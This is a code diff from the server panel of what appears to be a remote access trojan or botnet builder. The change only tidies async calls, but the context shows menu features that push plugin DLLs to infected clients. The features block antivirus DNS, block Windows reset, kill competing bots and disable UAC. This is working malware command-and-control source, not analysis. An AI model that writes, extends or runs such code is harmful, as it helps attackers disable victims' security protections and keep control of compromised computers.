@@ -107,11 +107,11 @@ internal static class FeatureContextMenu
             {
                 var cachePath = PluginCache("Block AV DNS");
                 if (!System.IO.File.Exists(cachePath))
-                { mainWindow.Dispatcher.BeginInvoke(() => ServerWindow.LogGlobal("[!] Block AV DNS: plugin not compiled yet. Run it from Auto Tasks first.")); return; }
+                { _ = mainWindow.Dispatcher.BeginInvoke(() => ServerWindow.LogGlobal("[!] Block AV DNS: plugin not compiled yet. Run it from Auto Tasks first.")); return; }
                 var bytes = await System.IO.File.ReadAllBytesAsync(cachePath);
                 var pkt = new Packet { Type = PacketType.PluginExec, Data = Newtonsoft.Json.JsonConvert.SerializeObject(new PluginExecData { DllBase64 = Convert.ToBase64String(bytes), ExportName = "PluginMain", PluginKind = "block_av_dns" }) };
                 await server.SendToClient(clientId, pkt);
-                mainWindow.Dispatcher.BeginInvoke(() => ServerWindow.LogGlobal($"[ADMIN] Block AV DNS sent to {clientId}."));
+                _ = mainWindow.Dispatcher.BeginInvoke(() => ServerWindow.LogGlobal($"[ADMIN] Block AV DNS sent to {clientId}."));
             });
         }));
         misc.Items.Add(MakeItem(Lang.Get("FEAT_BLOCK_WSRESET"), "SvgImages/Icon Builder/Security_Lock.svg", () =>
@@ -120,11 +120,11 @@ internal static class FeatureContextMenu
             {
                 var cachePath = PluginCache("Block Reset");
                 if (!System.IO.File.Exists(cachePath))
-                { mainWindow.Dispatcher.BeginInvoke(() => ServerWindow.LogGlobal("[!] Block WSReset: plugin not compiled yet. Run it from Auto Tasks first.")); return; }
+                { _ = mainWindow.Dispatcher.BeginInvoke(() => ServerWindow.LogGlobal("[!] Block WSReset: plugin not compiled yet. Run it from Auto Tasks first.")); return; }
                 var bytes = await System.IO.File.ReadAllBytesAsync(cachePath);
                 var pkt = new Packet { Type = PacketType.PluginExec, Data = Newtonsoft.Json.JsonConvert.SerializeObject(new PluginExecData { DllBase64 = Convert.ToBase64String(bytes), ExportName = "PluginMain" }) };
                 await server.SendToClient(clientId, pkt);
-                mainWindow.Dispatcher.BeginInvoke(() => ServerWindow.LogGlobal($"[ADMIN] Block WSReset sent to {clientId}."));
+                _ = mainWindow.Dispatcher.BeginInvoke(() => ServerWindow.LogGlobal($"[ADMIN] Block WSReset sent to {clientId}."));
             });
         }));
         misc.Items.Add(MakeItem(Lang.Get("FEAT_DISABLE_UAC"),      "SvgImages/Icon Builder/Security_Unlock.svg",  () =>
@@ -144,11 +144,11 @@ internal static class FeatureContextMenu
             {
                 var cachePath = PluginCache("BotKiller");
                 if (!System.IO.File.Exists(cachePath))
-                { mainWindow.Dispatcher.BeginInvoke(() => ServerWindow.LogGlobal("[!] BotKiller: plugin not compiled yet. Run it from Auto Tasks first.")); return; }
+                { _ = mainWindow.Dispatcher.BeginInvoke(() => ServerWindow.LogGlobal("[!] BotKiller: plugin not compiled yet. Run it from Auto Tasks first.")); return; }
                 var bytes = await System.IO.File.ReadAllBytesAsync(cachePath);
                 var pkt = new Packet { Type = PacketType.PluginExec, Data = Newtonsoft.Json.JsonConvert.SerializeObject(new PluginExecData { DllBase64 = Convert.ToBase64String(bytes), ExportName = "PluginMain" }) };
                 await server.SendToClient(clientId, pkt);
-                mainWindow.Dispatcher.BeginInvoke(() => ServerWindow.LogGlobal($"[ADMIN] BotKiller sent to {clientId}."));
+                _ = mainWindow.Dispatcher.BeginInvoke(() => ServerWindow.LogGlobal($"[ADMIN] BotKiller sent to {clientId}."));
             });
         }));
         menu.Items.Add(misc);
